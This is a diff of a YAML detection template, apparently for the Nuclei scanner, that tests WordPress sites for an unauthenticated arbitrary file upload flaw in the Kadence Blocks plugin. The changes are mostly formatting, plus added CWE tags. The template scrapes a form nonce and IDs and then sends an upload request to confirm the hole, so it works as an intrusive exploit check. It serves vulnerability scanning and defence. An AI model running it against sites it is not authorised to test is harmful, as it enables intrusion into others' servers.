@@ -1,5 +1,4 @@
 id: wp-kadence-blocks-rce
-
 info:
   name: WordPress Gutenberg Blocks Plugin <= 3.1.10 - Arbitrary File Upload
   author: theamanrawat
@@ -10,21 +9,52 @@ info:
   reference:
     - https://wordpress.org/plugins/kadence-blocks/
     - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/kadence-blocks/kadence-blocks-3110-unauthenticated-arbitrary-file-upload
+  classification:
+    cwe-id:
+      - CWE-434
+      - CWE-94
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive
-    verified: true
     max-request: 2
-    publicwww-query: "/wp-content/plugins/kadence-blocks/"
-  tags: rce,wpscan,wordpress,wp-plugin,wp,kadence-blocks,fileupload,intrusive,vuln
-
+    publicwww-query: /wp-content/plugins/kadence-blocks/
+    verified: true
+  tags: fileupload,intrusive,kadence-blocks,rce,vuln,wordpress,wp,wp-plugin,wpscan
 variables:
-  str: "{{to_lower(rand_text_alpha(5))}}"
-  email: "{{rand_base(8)}}@{{rand_base(5)}}.com"
-  filename: "{{to_lower(rand_text_alpha(5))}}"
-  string: "wp-kadence-blocks-rce"
-
+  email: '{{rand_base(8)}}@{{rand_base(5)}}.com'
+  filename: '{{to_lower(rand_text_alpha(5))}}'
+  str: '{{to_lower(rand_text_alpha(5))}}'
+  string: wp-kadence-blocks-rce
 http:
-  - raw:
+  - extractors:
+      - group: 1
+        internal: true
+        name: nonce
+        part: body_1
+        regex:
+          - kb_adv_form_params\s*=\s*{[^}]*"nonce"\s*:\s*"([^"]*)"
+        type: regex
+      - group: 1
+        internal: true
+        name: form_id
+        part: body_1
+        regex:
+          - name="_kb_adv_form_id" value="([^"]*)"
+        type: regex
+      - group: 1
+        internal: true
+        name: post_id
+        part: body_1
+        regex:
+          - name="_kb_adv_form_post_id" value="([^"]*)"
+        type: regex
+    matchers:
+      - condition: and
+        dsl:
+          - status_code_2 == 200
+          - contains(header_2, "application/json")
+          - contains_all(body_2, "Submission Success, Thanks for getting in touch!", "success\":true")
+        type: dsl
+    raw:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
@@ -69,37 +99,3 @@ http:
 
         {{nonce}}
         -----------------------------8779924633391890046425977712--
-
-    matchers:
-      - type: dsl
-        dsl:
-          - 'status_code_2 == 200'
-          - 'contains(header_2, "application/json")'
-          - 'contains_all(body_2, "Submission Success, Thanks for getting in touch!", "success\":true")'
-        condition: and
-
-    extractors:
-      - type: regex
-        name: nonce
-        part: body_1
-        group: 1
-        regex:
-          - 'kb_adv_form_params\s*=\s*{[^}]*"nonce"\s*:\s*"([^"]*)"'
-        internal: true
-
-      - type: regex
-        name: form_id
-        part: body_1
-        group: 1
-        regex:
-          - 'name="_kb_adv_form_id" value="([^"]*)"'
-        internal: true
-
-      - type: regex
-        name: post_id
-        part: body_1
-        group: 1
-        regex:
-          - 'name="_kb_adv_form_post_id" value="([^"]*)"'
-        internal: true
-
